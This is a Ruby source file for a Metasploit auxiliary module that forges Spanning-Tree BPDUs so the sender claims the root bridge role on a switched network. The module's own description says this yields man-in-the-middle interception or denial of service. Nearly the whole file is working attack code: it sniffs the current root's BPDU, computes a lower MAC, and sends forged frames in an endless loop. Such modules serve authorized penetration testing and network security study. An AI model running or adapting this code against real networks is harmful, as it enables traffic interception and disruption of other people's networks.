##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

#begin auxiliary/spoof/cisco/stp.rb
require 'msf/core'
require 'racket'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Capture

  def initialize
    super(
      'Name'           => 'Forge Spanning-Tree BPDUs',
      'Description'    => %q{
          This module forges Spanning-Tree BPDUs to claim
        the Root role. This will either result in a MiTM or a DOS.  You need to set
        the RMAC field to a MAC address lower than the current root
        bridge (hint: use wireshark) or use AUTO to sniff and generate one.
      },
      'Author'         => [ 'Spencer McIntyre' ],
      'License'        => MSF_LICENSE,
      'Version'        => '$Revision$',
      'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service'
    )

    begin
      require 'pcaprub'
      @@havepcap = true
    rescue ::LoadError
      @@havepcap = false
    end

    register_options([
      OptString.new('RMAC', [ false, "The Root MAC To Spoof", '00:00:00:00:00:00']),
      OptBool.new('AUTO', [ true, "Automatically Guess A Lower Root MAC", true]),
      OptString.new('INTERFACE', [true, "The name of the interface", 'eth0'])
    ])

    deregister_options('FILTER','PCAPFILE','RHOST','SNAPLEN','TIMEOUT','UDP_SECRET', 'NETMASK', 'GATEWAY')
    register_advanced_options([
      OptInt.new('MaxAge', [ true, "The amount of time a switch will retain a BPDU's contents before discarding it.", 20]),
      OptInt.new('HelloTime', [ true, "The interval between BPDUs.", 2]),
      OptInt.new('ForwardDelay', [ true, "The time spent in the listening and learning states.", 15]),
      OptInt.new('Wait', [ true, "The amount of time to sniff for a STP BPDU to guess the root MAC", 15]),
    ])
  end

  def run
    @auto = false
    if (datastore['AUTO'].to_s.match(/^(t|y|1)/i))
      @auto = true
    end
    if @auto
      raise "Pcaprub is not available" if not @@havepcap
      open_pcap({'FILTER' => 'ether dst 01:80:C2:00:00:00'})
      pcap = self.capture
      begin
        Timeout.timeout(datastore['Wait'].to_i) do
          pcap.each do |r|
            eth = Racket::L2::Ethernet.new( r )
            llc = Racket::L2::LLC.new( eth.payload )
            stp = Racket::L3::STP.new( llc.payload )

            @rmac = stp.root_id	#the following 8 lines make sure the MAC is lower so we can steal the root
            $i = 9;
            until (@rmac.to_s[$i .. ($i + 1)].hex - 1) > 0 do
              if $i == 0
                next
              end
              $i = $i - 3
            end
            tmp = (@rmac.to_s[$i .. ($i + 1)].hex - 1)
            if tmp < 16
              @rmac = @rmac[0 .. ($i - 1)] + '0' + tmp.to_s(16) + @rmac[($i + 2) .. 16]
            else
              @rmac = @rmac[0 .. ($i - 1)] + tmp.to_s(16) + @rmac[($i + 2) .. 16]
            end
            break
          end
        end
      rescue Timeout::Error
        print_error('stp: Could Not Find STP Instance')
        return 0
      end
    end
    ###
    @run = true
    n = Racket::Racket.new
    helloTime = datastore['HelloTime'].to_i
    forwardDelay = datastore['ForwardDelay'].to_i
    maxAge = datastore['MaxAge'].to_i

    n.l2 = Racket::L2::Ethernet.new()
    if @auto
      src_mac = @rmac.to_s[0 .. 15]
      src_mac << (16 + rand(238)).to_s(16)
      n.l2.src_mac = src_mac
    else
      @rmac = datastore['RMAC']
      if @rmac.length != 17
        print_error('stp: Invalid Field RMAC')
        return 0
      end
      n.l2.src_mac = @rmac
      @rmac = @rmac.to_s[0 .. 15] << '00'
    end
    n.l2.dst_mac = '01:80:c2:00:00:00'			# this has to stay the same
    n.l2.ethertype = 0x0026

    n.l3 = Racket::L2::LLC.new()
    n.l3.control = 0x03
    n.l3.dsap = 0x42
    n.l3.ssap = 0x42

    n.l4 = Racket::L3::STP.new()
    n.l4.protocol = 0x0000
    n.l4.version = 0x00
    n.l4.bpdu_type = 0x00
    n.l4.root_id = @rmac
    n.l4.root_wtf = ( 0b1000 * (2 ** 12))
    n.l4.root_cost = 0x0000
    n.l4.bridge_id = @rmac
    n.l4.bridge_wtf = ( 0b1000 * (2 ** 12))
    n.l4.port_id = 0x8001
    n.l4.msg_age = 0x0000
    n.l4.max_age = maxAge * 256
    n.l4.hello_time = helloTime * 256
    n.l4.forward_delay = forwardDelay * 256
    n.l4.payload = "\x00\x00\x00\x00\x00\x00\x00\x00"

    n.iface = datastore['INTERFACE']
    n.pack()

    while @run
      n.send2()
      select(nil, nil, nil, helloTime)
    end

  end

end
